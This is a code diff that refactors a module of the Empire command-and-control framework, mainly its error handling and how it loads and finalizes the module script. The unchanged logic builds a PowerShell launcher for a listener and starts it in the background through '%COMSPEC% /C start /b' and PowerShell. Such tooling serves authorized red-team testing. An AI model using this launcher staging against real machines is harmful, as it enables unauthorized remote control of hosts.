@@ -1,16 +1,20 @@
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
+from empire.server.core.module_service import auto_finalize, auto_get_source
 
 
 class Module:
     @staticmethod
+    @auto_get_source
+    @auto_finalize
     def generate(
         main_menu: MainMenu,
         module: EmpireModule,
         params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
+        script: str = "",
     ):
         # staging options
         listener_name = params["Listener"]
@@ -28,28 +32,18 @@ class Module:
 
         # Only "Command" or "Listener" but not both
         if listener_name == "" and command == "":
-            return handle_error_message("[!] Listener or Command required")
+            raise ModuleValidationException("Listener or Command required")
         if listener_name and command:
-            return handle_error_message(
+            raise ModuleValidationException(
                 "[!] Cannot use Listener and Command at the same time"
             )
-
-        # read in the common module source code
-        script, err = main_menu.modulesv2.get_module_source(
-            module_name=module.script_path,
-            obfuscate=obfuscate,
-            obfuscate_command=obfuscation_command,
-        )
-
-        if err:
-            return handle_error_message(err)
 
         if (
             not main_menu.listenersv2.get_active_listener_by_name(listener_name)
             and not command
         ):
             # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: " + listener_name)
+            raise ModuleValidationException("Invalid listener: " + listener_name)
 
         if listener_name:
             # generate the PowerShell one-liner with all of the proper options set
@@ -66,7 +60,7 @@ class Module:
             )
 
             if launcher == "":
-                return handle_error_message("[!] Error in launcher generation.")
+                raise ModuleValidationException("Error in launcher generation.")
 
             Cmd = (
                 "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
@@ -85,9 +79,4 @@ class Module:
             + ' completed!"'
         )
 
-        return main_menu.modulesv2.finalize_module(
-            script=script,
-            script_end=script_end,
-            obfuscate=obfuscate,
-            obfuscation_command=obfuscation_command,
-        )
+        return script, script_end
